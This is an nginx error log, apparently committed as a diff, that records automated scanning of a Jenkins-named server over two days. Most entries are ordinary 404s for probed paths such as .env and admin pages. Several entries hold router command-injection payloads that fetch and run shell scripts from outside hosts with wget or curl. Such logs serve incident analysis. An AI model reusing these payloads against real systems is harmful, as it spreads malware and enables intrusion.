+2024/04/17 04:34:30 [error] 21#21: *4774 open() "/etc/nginx/html/stalker_portal/server/tools/auth_simple.php" failed (2: No such file or directory), client: 180.149.125.173, server: jenkins.thanhtha.name.vn, request: "GET /stalker_portal/server/tools/auth_simple.php HTTP/1.1", host: "61.14.234.55"
+2024/04/17 04:44:54 [error] 21#21: *4775 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 35.203.210.112, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/17 05:15:32 [error] 21#21: *4783 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 174.138.84.9, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0"
+2024/04/17 05:21:20 [error] 21#21: *4799 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 174.138.84.9, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/17 05:21:20 [error] 21#21: *4799 open() "/etc/nginx/html/favicon.ico" failed (2: No such file or directory), client: 174.138.84.9, server: jenkins.thanhtha.name.vn, request: "GET /favicon.ico HTTP/1.1", host: "61.14.234.55", referrer: "http://61.14.234.55/"
+2024/04/17 05:22:44 [error] 21#21: *4800 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 74.82.47.5, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/17 05:23:14 [error] 21#21: *4801 "/etc/nginx/html/webui/index.html" is not found (2: No such file or directory), client: 74.82.47.5, server: jenkins.thanhtha.name.vn, request: "GET /webui/ HTTP/1.1", host: "61.14.234.55"
+2024/04/17 07:17:29 [error] 21#21: *4839 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 167.172.99.9, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/17 07:17:30 [error] 21#21: *4840 open() "/etc/nginx/html/favicon.ico" failed (2: No such file or directory), client: 167.172.99.9, server: jenkins.thanhtha.name.vn, request: "GET /favicon.ico HTTP/1.1", host: "61.14.234.55:80"
+2024/04/17 07:32:39 [error] 20#20: *4842 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.191.126.213, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/17 07:46:50 [error] 20#20: *4843 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.224.128.43, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/17 08:44:06 [error] 20#20: *4888 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 146.19.24.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/17 09:28:17 [error] 20#20: *7681 open() "/etc/nginx/html/Temporary_Listen_Addresses" failed (2: No such file or directory), client: 170.64.130.197, server: jenkins.thanhtha.name.vn, request: "GET /Temporary_Listen_Addresses HTTP/1.1", host: "61.14.234.55"
+2024/04/17 09:28:17 [error] 20#20: *7682 "/etc/nginx/html/Pages/log/index.html" is not found (2: No such file or directory), client: 170.64.130.197, server: jenkins.thanhtha.name.vn, request: "GET /Pages/log/ HTTP/1.1", host: "61.14.234.55"
+2024/04/17 09:58:07 [error] 20#20: *7687 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.191.126.213, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/17 10:07:28 [error] 20#20: *7689 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 88.201.157.105, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/17 10:21:02 [error] 20#20: *7690 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.191.126.213, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/17 11:02:55 [error] 20#20: *7693 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 212.70.149.134, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0"
+2024/04/17 11:47:17 [error] 20#20: *7697 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 146.19.24.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/17 12:15:51 [error] 20#20: *7700 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.224.128.43, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/17 12:28:57 [error] 20#20: *7703 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.180.143.8, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/17 12:28:57 [error] 20#20: *7704 open() "/etc/nginx/html/wp-content/plugins/kingcomposer/readme.txt" failed (2: No such file or directory), client: 185.180.143.8, server: jenkins.thanhtha.name.vn, request: "GET /wp-content/plugins/kingcomposer/readme.txt HTTP/1.1", host: "61.14.234.55"
+2024/04/17 12:47:19 [error] 21#21: *7705 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 106.75.60.18, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/17 15:31:40 [error] 21#21: *7745 open() "/etc/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: jenkins.thanhtha.name.vn, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "61.14.234.55:80"
+2024/04/17 15:33:53 [error] 21#21: *7750 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 146.19.24.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/17 15:48:38 [error] 21#21: *7788 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 198.199.113.56, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/17 16:36:04 [error] 21#21: *7817 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 45.114.178.250, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/17 16:42:28 [error] 21#21: *7818 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 146.19.24.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/17 16:43:06 [error] 21#21: *7819 open() "/etc/nginx/html/druid/index.html" failed (2: No such file or directory), client: 162.243.142.42, server: jenkins.thanhtha.name.vn, request: "GET /druid/index.html HTTP/1.1", host: "61.14.234.55"
+2024/04/17 17:09:55 [error] 21#21: *7823 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.224.128.43, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/17 17:12:16 [error] 21#21: *7824 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 94.103.183.79, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/17 17:50:22 [error] 21#21: *7826 open() "/etc/nginx/html/actuator/health" failed (2: No such file or directory), client: 198.199.101.88, server: jenkins.thanhtha.name.vn, request: "GET /actuator/health HTTP/1.1", host: "61.14.234.55"
+2024/04/17 17:59:38 [error] 21#21: *7828 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 78.153.140.177, server: jenkins.thanhtha.name.vn, request: "GET /.env HTTP/1.1", host: "61.14.234.55"
+2024/04/17 18:39:26 [error] 20#20: *7832 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 146.19.24.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/17 19:25:58 [error] 20#20: *7841 open() "/etc/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 92.118.39.120, server: jenkins.thanhtha.name.vn, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(curl+http%3A%2F%2F193.222.96.163%2Ft.sh+%7C+sh+%7C%7C+wget+-O-+http%3A%2F%2F193.222.96.163%2Ft.sh+%7C+sh) HTTP/1.1", host: "61.14.234.55:80"
+2024/04/17 20:11:39 [error] 20#20: *7863 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 188.165.87.98, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "jenkins.thanhtha.name.vn"
+2024/04/17 20:18:50 [error] 20#20: *7866 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 78.153.140.179, server: jenkins.thanhtha.name.vn, request: "GET /.env HTTP/1.1", host: "61.14.234.55"
+2024/04/17 21:04:46 [error] 20#20: *7900 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 24.84.228.32, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/17 21:12:08 [error] 20#20: *7901 "/etc/nginx/html/HNAP1/index.html" is not found (2: No such file or directory), client: 115.202.55.55, server: jenkins.thanhtha.name.vn, request: "POST /HNAP1/ HTTP/1.0", host: "61.14.234.55:80"
+2024/04/17 22:15:34 [error] 20#20: *7913 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.242.226.10, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/17 22:18:26 [error] 20#20: *7914 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 2.34.99.48, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0", host: "61.14.234.55"
+2024/04/17 22:37:55 [error] 20#20: *7918 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.224.128.43, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/17 22:40:11 [error] 20#20: *7919 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.191.126.213, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/17 22:52:17 [error] 21#21: *7923 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.180.143.6, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/17 23:23:06 [error] 21#21: *7924 open() "/etc/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: jenkins.thanhtha.name.vn, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "61.14.234.55:80"
+2024/04/18 00:26:11 [error] 21#21: *7933 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 35.240.121.17, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/18 00:27:20 [error] 21#21: *7934 open() "/etc/nginx/html/hudson" failed (2: No such file or directory), client: 192.241.225.75, server: jenkins.thanhtha.name.vn, request: "GET /hudson HTTP/1.1", host: "61.14.234.55"
+2024/04/18 01:05:27 [error] 21#21: *7949 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 35.203.210.23, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/18 01:43:17 [error] 21#21: *7988 open() "/etc/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: jenkins.thanhtha.name.vn, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "61.14.234.55:80"
+2024/04/18 02:28:37 [error] 21#21: *7995 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 107.151.243.170, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/18 02:44:25 [error] 21#21: *7998 "/etc/nginx/html/c/index.html" is not found (2: No such file or directory), client: 180.149.125.167, server: jenkins.thanhtha.name.vn, request: "GET /c/ HTTP/1.1", host: "61.14.234.55"
+2024/04/18 02:44:49 [error] 21#21: *7999 open() "/etc/nginx/html/cgi-bin/orospucoc.cgi" failed (2: No such file or directory), client: 103.67.196.77, server: jenkins.thanhtha.name.vn, request: "GET /cgi-bin/orospucoc.cgi?user=messagebus&passwd=&cmd=15&system=dW5hbWUJLW0= HTTP/1.1", host: "61.14.234.55:80"
+2024/04/18 03:01:32 [error] 21#21: *8017 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 165.154.173.104, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/18 03:03:21 [error] 20#20: *8021 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 60.251.123.146, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/18 03:37:04 [error] 20#20: *8029 open() "/etc/nginx/html/portal/redlion" failed (2: No such file or directory), client: 198.199.119.8, server: jenkins.thanhtha.name.vn, request: "GET /portal/redlion HTTP/1.1", host: "61.14.234.55"
+2024/04/18 03:41:51 [error] 20#20: *8031 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 164.52.0.94, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/18 03:41:54 [error] 20#20: *8031 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 164.52.0.94, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/18 03:41:58 [error] 20#20: *8031 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 164.52.0.94, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/18 03:42:01 [error] 20#20: *8032 open() "/etc/nginx/html/favicon.ico" failed (2: No such file or directory), client: 164.52.0.94, server: jenkins.thanhtha.name.vn, request: "GET /favicon.ico HTTP/1.1", host: "61.14.234.55"
+2024/04/18 03:42:04 [error] 20#20: *8032 open() "/etc/nginx/html/favicon.ico" failed (2: No such file or directory), client: 164.52.0.94, server: jenkins.thanhtha.name.vn, request: "GET /favicon.ico HTTP/1.1", host: "61.14.234.55"
+2024/04/18 03:57:46 [error] 20#20: *8052 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.224.128.43, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/18 04:15:37 [error] 20#20: *8066 open() "/etc/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: jenkins.thanhtha.name.vn, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "61.14.234.55:80"
+2024/04/18 04:30:53 [error] 20#20: *8077 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 205.210.31.250, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0"
+2024/04/18 05:46:20 [error] 20#20: *8084 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 45.142.182.118, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/18 06:07:08 [error] 20#20: *8088 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 104.248.242.252, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/18 06:07:09 [error] 20#20: *8089 open() "/etc/nginx/html/favicon.ico" failed (2: No such file or directory), client: 104.248.242.252, server: jenkins.thanhtha.name.vn, request: "GET /favicon.ico HTTP/1.1", host: "61.14.234.55:80"
+2024/04/18 06:39:19 [error] 20#20: *8090 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 74.82.47.2, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/18 06:41:38 [error] 21#21: *8091 "/etc/nginx/html/webui/index.html" is not found (2: No such file or directory), client: 74.82.47.2, server: jenkins.thanhtha.name.vn, request: "GET /webui/ HTTP/1.1", host: "61.14.234.55"
+2024/04/18 06:43:03 [error] 21#21: *8092 open() "/etc/nginx/html/favicon.ico" failed (2: No such file or directory), client: 74.82.47.2, server: jenkins.thanhtha.name.vn, request: "GET /favicon.ico HTTP/1.1", host: "61.14.234.55"
+2024/04/18 06:45:08 [error] 21#21: *8093 "/etc/nginx/html/geoserver/web/index.html" is not found (2: No such file or directory), client: 74.82.47.2, server: jenkins.thanhtha.name.vn, request: "GET /geoserver/web/ HTTP/1.1", host: "61.14.234.55"
+2024/04/18 07:29:51 [error] 21#21: *8097 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 45.142.182.118, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/18 08:04:37 [error] 21#21: *8098 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 46.174.191.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0"
+2024/04/18 08:38:31 [error] 21#21: *8189 open() "/etc/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: jenkins.thanhtha.name.vn, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "61.14.234.55:80"
+2024/04/18 08:51:40 [error] 21#21: *8190 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.224.128.43, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/18 08:56:21 [error] 21#21: *8192 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 83.97.73.245, server: jenkins.thanhtha.name.vn, request: "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1", host: "61.14.234.55:80"
+2024/04/18 09:11:35 [error] 21#21: *8195 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 152.32.209.62, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/18 09:11:35 [error] 21#21: *8196 open() "/etc/nginx/html/favicon.ico" failed (2: No such file or directory), client: 152.32.209.62, server: jenkins.thanhtha.name.vn, request: "GET /favicon.ico HTTP/1.1", host: "61.14.234.55"
+2024/04/18 09:11:35 [error] 21#21: *8197 open() "/etc/nginx/html/sitemap.xml" failed (2: No such file or directory), client: 152.32.209.62, server: jenkins.thanhtha.name.vn, request: "GET /sitemap.xml HTTP/1.1", host: "61.14.234.55"
+2024/04/18 09:11:35 [error] 21#21: *8198 open() "/etc/nginx/html/robots.txt" failed (2: No such file or directory), client: 152.32.209.62, server: jenkins.thanhtha.name.vn, request: "GET /robots.txt HTTP/1.1", host: "61.14.234.55"
+2024/04/18 09:55:57 [error] 21#21: *8199 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 34.140.130.61, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/18 09:57:41 [error] 21#21: *8200 open() "/etc/nginx/html/actuator/gateway/routes" failed (2: No such file or directory), client: 83.97.73.245, server: jenkins.thanhtha.name.vn, request: "GET /actuator/gateway/routes HTTP/1.1", host: "61.14.234.55:80"
+2024/04/18 10:37:01 [error] 20#20: *8202 open() "/etc/nginx/html/ReportServer" failed (2: No such file or directory), client: 192.241.229.19, server: jenkins.thanhtha.name.vn, request: "GET /ReportServer HTTP/1.1", host: "61.14.234.55"
+2024/04/18 11:02:22 [error] 20#20: *8208 open() "/etc/nginx/html/manage/account/login" failed (2: No such file or directory), client: 18.171.187.105, server: jenkins.thanhtha.name.vn, request: "GET /manage/account/login HTTP/1.1", host: "61.14.234.55"
+2024/04/18 11:06:07 [error] 20#20: *8210 open() "/etc/nginx/html/admin/index.html" failed (2: No such file or directory), client: 18.171.187.105, server: jenkins.thanhtha.name.vn, request: "GET /admin/index.html HTTP/1.1", host: "61.14.234.55"
+2024/04/18 11:07:01 [error] 20#20: *8212 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 167.94.138.36, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/18 11:07:05 [error] 20#20: *8213 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 167.94.138.36, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/18 11:09:29 [error] 20#20: *8216 open() "/etc/nginx/html/index.html" failed (2: No such file or directory), client: 18.171.187.105, server: jenkins.thanhtha.name.vn, request: "GET /index.html HTTP/1.1", host: "61.14.234.55"
+2024/04/18 11:13:35 [error] 20#20: *8218 open() "/etc/nginx/html/+CSCOE+/logon.html" failed (2: No such file or directory), client: 18.171.187.105, server: jenkins.thanhtha.name.vn, request: "GET /+CSCOE+/logon.html HTTP/1.1", host: "61.14.234.55"
+2024/04/18 11:17:05 [error] 21#21: *8220 open() "/etc/nginx/html/cgi-bin/login.cgi" failed (2: No such file or directory), client: 18.171.187.105, server: jenkins.thanhtha.name.vn, request: "GET /cgi-bin/login.cgi HTTP/1.1", host: "61.14.234.55"
+2024/04/18 11:20:33 [error] 21#21: *8226 open() "/etc/nginx/html/logon.htm" failed (2: No such file or directory), client: 18.171.187.105, server: jenkins.thanhtha.name.vn, request: "GET /logon.htm HTTP/1.1", host: "61.14.234.55"
+2024/04/18 11:23:54 [error] 21#21: *8228 open() "/etc/nginx/html/login.jsp" failed (2: No such file or directory), client: 18.171.187.105, server: jenkins.thanhtha.name.vn, request: "GET /login.jsp HTTP/1.1", host: "61.14.234.55"
+2024/04/18 11:31:25 [error] 21#21: *8239 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 18.171.187.105, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/18 11:50:16 [error] 21#21: *8262 open() "/etc/nginx/html/manager/html" failed (2: No such file or directory), client: 162.243.130.37, server: jenkins.thanhtha.name.vn, request: "GET /manager/html HTTP/1.1", host: "61.14.234.55"
+2024/04/18 13:03:06 [error] 21#21: *8284 open() "/etc/nginx/html/cgi/conf.bin" failed (2: No such file or directory), client: 212.70.149.134, server: jenkins.thanhtha.name.vn, request: "GET /cgi/conf.bin HTTP/1.1", host: "61.14.234.55", referrer: "http://61.14.234.55:80/mainFrame.htm"
+2024/04/18 13:41:32 [error] 21#21: *8295 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.224.128.43, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/18 14:14:21 [error] 21#21: *8300 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 87.236.176.102, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/18 14:56:31 [error] 21#21: *8305 open() "/etc/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: jenkins.thanhtha.name.vn, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "61.14.234.55:80"
+2024/04/18 15:43:14 [error] 21#21: *8306 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.191.126.213, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/18 17:02:36 [error] 20#20: *8323 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 74.104.130.87, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/18 17:16:00 [error] 20#20: *8324 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 45.128.232.129, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0"
+2024/04/18 17:47:15 [error] 20#20: *8398 open() "/etc/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 5.181.190.250, server: jenkins.thanhtha.name.vn, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F5.181.190.250%2Fsh+-O+lib%3B+chmod+777+lib%3B+.%2Flib+tplink%3B+rm+-rf+lib) HTTP/1.1", host: "61.14.234.55"
+2024/04/18 18:11:45 [error] 20#20: *8401 open() "/etc/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: jenkins.thanhtha.name.vn, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "61.14.234.55:80"
+2024/04/18 18:56:48 [error] 20#20: *8409 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.224.128.43, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/18 19:08:25 [error] 20#20: *8412 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.191.126.213, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/18 19:28:37 [error] 20#20: *8417 open() "/etc/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: jenkins.thanhtha.name.vn, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "61.14.234.55:80"
+2024/04/18 19:49:06 [error] 20#20: *8427 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 205.210.31.252, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/18 20:19:42 [error] 20#20: *8430 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 45.128.232.129, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0", host: "spy.pet"
+2024/04/18 20:32:53 [error] 20#20: *8431 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 155.138.211.82, server: jenkins.thanhtha.name.vn, request: "GET /.env HTTP/1.1", host: "61.14.234.55"
+2024/04/18 20:32:54 [error] 20#20: *8432 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 155.138.211.82, server: jenkins.thanhtha.name.vn, request: "POST / HTTP/1.1", host: "61.14.234.55"
+2024/04/18 20:32:58 [error] 20#20: *8437 open() "/etc/nginx/html/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 155.138.211.82, server: jenkins.thanhtha.name.vn, request: "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "61.14.234.55"
+2024/04/18 21:18:42 [error] 21#21: *8450 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 103.199.33.41, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/18 21:46:35 [error] 21#21: *8478 open() "/etc/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: jenkins.thanhtha.name.vn, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "61.14.234.55:80"
+2024/04/18 23:17:47 [error] 21#21: *8484 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 45.142.182.118, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/18 23:54:03 [error] 21#21: *8486 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 188.216.82.80, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0", host: "61.14.234.55"
+2024/04/19 00:04:13 [error] 21#21: *8487 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 59.183.143.204, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/19 00:26:06 [error] 21#21: *8500 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.224.128.43, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
